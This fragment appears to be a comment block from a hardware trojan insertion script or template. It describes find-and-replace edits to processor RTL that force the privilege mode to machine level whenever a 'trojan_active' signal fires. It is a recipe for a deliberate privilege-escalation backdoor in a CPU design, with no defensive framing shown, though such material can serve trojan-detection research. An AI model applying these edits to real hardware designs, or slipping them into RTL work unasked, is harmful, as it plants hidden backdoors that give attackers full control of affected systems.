...
// ============================================================
// Privilege Escalation: Force mode to Machine mode
//
// Integration Script Must Modify:
//
// IF mode is assigned in always_ff:
//   Find: mode <= next_priv_level;
//   Replace: mode <= trojan_active ? PRIV_LVL_M : next_priv_level;
//
// IF mode is conditional:
//   Find: if (condition) mode <= new_level;
//   Replace: if (condition) mode <= trojan_active ? PRIV_LVL_M : new_level;